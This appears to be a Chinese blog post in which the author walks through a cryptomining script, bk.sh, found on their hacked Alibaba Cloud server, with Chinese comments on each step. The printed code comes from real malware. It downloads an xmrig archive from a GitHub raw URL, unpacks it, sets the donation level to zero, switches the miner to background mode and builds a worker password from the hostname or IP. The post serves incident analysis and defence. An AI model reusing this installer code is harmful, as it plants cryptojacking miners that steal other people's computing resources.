# 记上次黑客入侵阿里云主机 —— 代码分析（中）

已将问题反馈到阿里云安全团队客服，并向阿里云中心举报其地址。接下来是代码分析。(bk.sh)


## bk.sh，推测是靶机脚本(if及json部分)

### 第一层 if

参考信息源：

* [百度知道-Linux shell 脚本 $(id -u) 是什么意思？](https://zhidao.baidu.com/question/944658594109817212.html)
* [bbsmax-shell if判断中常用的a-z表达式含义](https://www.bbsmax.com/A/8Bz81Qa6Jx/)
* [linux 环境变量设置 -d,Linux环境变量的设置](https://blog.csdn.net/weixin_35565522/article/details/116774198)
* [Shell中的exit 0 和 exit 1是做什么的?](https://www.pianshen.com/article/37962128580/)
* [博客园-shell中的type命令](https://www.cnblogs.com/chaoguo1234/p/5723531.html)
* [Linux /dev/null详解](https://www.shuzhiduo.com/A/6pdDP9ALdw/)


```
#-----
# 判断是不是root权限
if [ "$(id -u)" == "0" ]; then
  echo ""
fi
#----
# 这部分是判断环境配置准备

# “-z 长度为零则为真”，做一个逆向判断，就是找不到这个目录，打印"请将home环境定义到主目录"。 
if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
# 异常退出，debug检测的。
  exit 1
fi
# 检查是否有家目录，没有则提示导入，引入家目录环境变量
if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo 'export HOME=<dir>'
  exit 1
fi

# 找不到curl命令定义，则丢入黑洞，跳出
if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

# `sudo -n true 2`返回“一个密码请求”的定义信息
# if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
# 看起来是调用（CPU几个核心数*7/10），如果为0，跳出。
CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi
```

以上这echo所打印的报错信息，基本也说明主机不能正常使用，这对他们黑客而言，已经没有任何价值了。如果这些正常的话，则运行下载好的挖矿脚本，以及其专用的挖矿程序。然后又是层层的if环境检验。

### 第二层 if

参考信息源：

* [入门小站-linux之curl命令](https://zhuanlan.zhihu.com/p/519406107)
* [sed -i 命令入门详解](https://blog.csdn.net/h4241778/article/details/125263518)
* [XMR恶意挖矿案例简析](https://www.sohu.com/a/260504074_354899)
* [诱捕黑客的蜜罐系统](https://baijiahao.baidu.com/s?id=1706341262655959831)
* [linux应用之test命令详细解析](https://www.cnblogs.com/tankblog/p/6160808.html)
* [Shell脚本中$0、$?、$!、$$、$*、$#、$@等的意义以及linux命令执行返回值代表意义](https://blog.csdn.net/helloxiaozhe/article/details/80940066)


```
# curl -L --progress-bar 显示网页内容与进度条，存在异常则直接中断退出。
if ! curl -L --progress-bar "https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  echo ""
  exit 1
fi

#  不能正常解压缩，退出删除文件
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool --strip=1; then
    echo ""
	echo ""
  fi
  rm /tmp/xmrig.tar.gz

# 使用正则，看上去是为了替换掉原有的config.json的donate-level的数值。
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/c3pool/config.json
  $HOME/c3pool/xmrig --help >/dev/null
  # $? 最后命令的退出状态的返回值。0表示没有错误，其他任何值表明有错误。
  #   # 比较，不等于0，再检验下xmrig还是不是文件，是就打印换行，否则跳出。
  if (test $? -ne 0); then 
    if [ -f $HOME/c3pool/xmrig ]; then
      echo ""
	  echo ""
    else 
      echo ""
	  echo ""
    fi
    exit 1
  fi
fi
```

### 推测其意，做环境判断之后，用正则配置json

参考信息源：

* [百度知道-Linux下面这条命令能逐个解释一下吗:cat /etc/passwd |cut -f 1 -d ](https://zhidao.baidu.com/question/555970944.html)
* [博客园-Linux命令之cut](https://www.cnblogs.com/zhoujingyu/p/4948051.html)
* [csdn-linux中的sed参数,sed一些参数的用法](https://blog.csdn.net/weixin_39891317/article/details/116855981)
* [linux 抽取ip地址,Linux bash脚本提取IP地址](https://blog.csdn.net/weixin_36371924/article/details/116767805)
* [linux中awk命令详解(最全面秒懂）](https://www.cnblogs.com/zhengyan6/p/16290156.html)

指令逐条解释

* `hostname | cut -f1 -d"."` 将hostname的输出结果，传递给cut，以“.”切割分段行显示
* `sed -r 's/[^a-zA-Z0-9\-]+/_/g'` 删除所有特殊字符(除了数字以及大小写字母)。
* `ip route get 1` 返回路由条目，包括IP、网关、uid。
* `awk '{print $NF;exit}'` 对内容空格分段。

```
PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
# 测试这条命令输出为0
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
# 推测是配置json账户信息
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi
```

将json拷贝一份，作为后台文件，再用sed配置成后台运行。

```
cp $HOME/c3pool/config.json $HOME/c3pool/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/c3pool/config_background.json
```

